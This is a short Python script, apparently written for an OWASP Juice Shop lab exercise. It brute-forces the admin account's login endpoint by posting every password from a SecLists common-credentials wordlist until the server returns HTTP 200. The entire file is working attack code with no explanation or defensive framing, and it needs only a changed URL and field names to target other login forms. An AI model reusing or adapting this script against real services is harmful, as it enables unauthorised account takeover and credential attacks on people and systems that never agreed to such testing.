#!/usr/bin/python3

import requests

ip = input(str("Enter assigned machine IP \n"))
print('\n======================')
session = requests.Session()
password = [line.rstrip('\n') for line in open('/usr/share/seclists/Passwords/Common-Credentials/best1050.txt')]

for i in password:
    url = "http://%s/rest/user/login" % (ip)
    cookies = {'io':'hFnRZ7xf9Ev0f5-fAAAC',
               'language':'en',
               'continueCode':'KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x'}
    r = session.post(url,
                     cookies = cookies,
                     data = {'email':'admin@juice-sh.op',
                             'password':i})
    if r.status_code == 200:
        print('\n' + str(r.status_code) + '\t' + str(i))
        break
    else:
        print(str(r.status_code) + '\t' + str(i))

